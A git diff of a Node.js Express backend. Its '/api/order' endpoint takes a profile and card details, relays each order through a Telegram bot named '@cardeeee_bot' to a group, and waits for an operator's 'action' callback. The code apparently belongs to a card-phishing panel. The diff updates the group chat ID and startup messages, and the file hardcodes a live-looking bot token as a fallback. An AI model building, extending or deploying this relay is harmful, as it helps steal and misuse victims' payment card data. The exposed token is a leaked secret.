@@ -1,5 +1,6 @@
 require("dotenv").config();
 
+
 const express = require("express");
 const cors = require("cors");
 const { v4: uuidv4 } = require("uuid");
@@ -8,8 +9,9 @@ const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*" }));
 
+
 const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
-const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();
+const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5200207290").trim();
 
 const DEFAULT_PORT = 38471;
 const PORT     = parseInt(process.env.PORT || String(DEFAULT_PORT), 10);
@@ -18,6 +20,7 @@ const SELF_URL = (process.env.SELF_URL || `http://localhost:${PORT}`).replace(/\
 const TIMEOUT_MS = 10 * 60 * 1000;
 
 const pending = new Map();
+
 
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
@@ -81,6 +84,7 @@ function waitForCallback(request_id) {
   });
 }
 
+
 app.post("/api/order", async (req, res) => {
   const { profile = {}, card = {}, amount = "" } = req.body;
   const request_id = uuidv4();
@@ -125,6 +129,7 @@ app.post("/api/order", async (req, res) => {
   res.json({ ok: true, request_id, action: result.action });
 });
 
+
 app.post("/api/callback", (req, res) => {
   const { request_id, action } = req.body || {};
   console.log(`[callback] request_id=${request_id}  action=${action}`);
@@ -145,11 +150,15 @@ app.get("/health", (_req, res) =>
   res.json({ ok: true, pending: pending.size })
 );
 
+
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Backend listening on http://0.0.0.0:${PORT}`);
   console.log(`  BOT_TOKEN     = ${BOT_TOKEN     ? "set ✓" : "NOT SET ✗"}`);
   console.log(`  GROUP_CHAT_ID = ${GROUP_CHAT_ID  || "NOT SET ✗"}`);
-  console.log(`  SELF_URL      = ${SELF_URL}`);
+  console.log(`  SELF_URL      = ${SELF_URL} (info only)`);
+  console.log(
+    "  Bot must POST to: .../api/callback — set BACKEND_CALLBACK_URL on PythonAnywhere"
+  );
   if (!BOT_TOKEN)     console.warn("  ⚠ Set BOT_TOKEN in .env (token of @cardeeee_bot)");
   if (!GROUP_CHAT_ID) console.warn("  ⚠ Set GROUP_CHAT_ID in .env (numeric Telegram group ID)");
 });
